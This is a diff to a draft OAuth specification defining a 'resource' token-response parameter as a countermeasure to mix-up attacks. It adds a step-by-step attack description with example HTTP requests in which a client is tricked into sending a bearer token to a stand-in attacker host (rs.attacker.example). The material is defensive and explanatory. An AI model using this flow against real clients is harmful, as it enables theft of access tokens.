@@ -27,20 +27,35 @@ author:
 --- abstract
 
 This document specifies a new parameter `resource` that is used to explicitly
-include the resource identifier of the resource that the access token in the
-token response is intended for.  This `resource` parameter serves as an
+include the resource identifier of the protected resource that the access token
+in the token response is intended for.  This `resource` parameter serves as an
 effective countermeasure to "mix-up attacks".
 
 --- middle
 
 # Introduction
 
+In traditional OAuth deployments, there is typically a pre-known relationship
+between authorization servers and the resource servers they protect.  Clients
+that request access to protected resources are manually registered ahead of
+time and understand the relationship issued access tokens and the protected
+resources for which those tokens are intended.
+
+As OAuth evolves to support more loosely-coupled deployments, clients are
+dynamically discovering configuration using OAuth 2.0 Protected Resource Metadata
+{{!RFC9728}} and OAuth 2.0 Authorization Server Metadata {{!RFC8414}} and
+registering using OAuth 2.0 Dynamic Client Registration Protocol {{!RFC7591}}.
+
 This document defines a new parameter in the token response called `resource`.
 The `resource` parameter allows the authorization server to explicitly include
 the identity of the protected resource(s) for which the access token is
-intended.  The `resource` parameter gives the client certainty about the
-protected resource(s) for which the access token is intended and enables it to
-send access tokens only to the intended recipients.
+intended.  The client can compare the value of the `resource` parameter to the
+resource identifier of the protected resource (e.g., retrieved from its
+metadata) it believes it is interacting with.  The `resource` parameter gives
+the client certainty about the protected resource(s) for which the access token
+is intended and enables it to send access tokens only to the intended
+recipients.  Therefore, the implementation of the `resource` parameter serves as
+an effective countermeasure to mix-up attacks.
 
 # Response Parameter resource
 
@@ -99,3 +114,77 @@ specification:
 `token_response_resource_parameter_supported`: Boolean parameter indicating
 whether the authorization server provides the `resource` parameter in the token
 response as defined in Section 2.  If omitted, the default value is false.
+
+# Attack Goals
+
+
+In this attack, an attacker tricks a client into sending an access token to the
+attacker instead of the honest resource server.
+
+# Attack Description
+
+The access token mix-up attack works as follows:
+
+1. The attacker sets up a malicious resource server (https://rs.attacker.example).
+
+2. The malicious resource server publishes metadata indicating that a victim
+   authorization server (https://as.victim.example) protects this resource server.
+   For example:
+
+   {
+      "resource":
+        "https://rs.attacker.example",
+      "authorization_servers":
+        ["https://as.victim.example"]
+   }
+
+3. The attacker tricks a legitimate client into connecting to the malicious
+   resource server, which challenges the client to authorize using the
+   dynamically discovered metadata.   For example:
+
+   HTTP/1.1 401 Unauthorized
+   WWW-Authenticate: Bearer resource_metadata=
+     "https://rs.attacker.example/.well-known/oauth-protected-resource"
+
+4. The legitimate client sends an authorization request to the victim authorization
+   server
+
+   GET /authorize?response_type=code
+        &client_id=example-client
+        &state=XzZaJlcwYew1u0QBrRv_Gw
+        &redirect_uri=https%3A%2F%2Fclient.example.org%2Fcb
+        &resource=https%3A%2F%2Frs.attacker.example HTTP/1.1
+  Host: as.victim.example
+
+5. The victim authorization server, which does not support resource indidicators,
+   receives this request and processes it according to pre-defined set of scope
+   for a victim protected resource (https://rs.victim.example).
+
+6. The user consents to authorize the legitimate client access to the victim protected
+   resource.
+
+7. The victim authorization server issues an access token to the legitimate client,
+   granting it access to the vicitim protected resource.  For example:
+
+   HTTP/1.1 200 OK
+   Content-Type: application/json
+
+   {
+     "access_token":"mF_9.B5f-4.1JqM",
+     "token_type":"Bearer",
+     "expires_in":3600,
+     "refresh_token":"tGzv3JOkF0XG5Qx2TlKWIA"
+   }
+
+7. The legitimate client utilized the access token to make a request to the malicious
+   resource server.  For example:
+
+   GET / HTTP/1.1
+   Host: rs.attacker.example
+   Authorization: Bearer mF_9.B5f-4.1JqM
+
+8. The malicious resource server is now in posession of an access token it can use
+   to make authorized requests to the victim resource server.
+
+
+// https://datatracker.ietf.org/doc/html/rfc9728#name-audience-restricted-access-
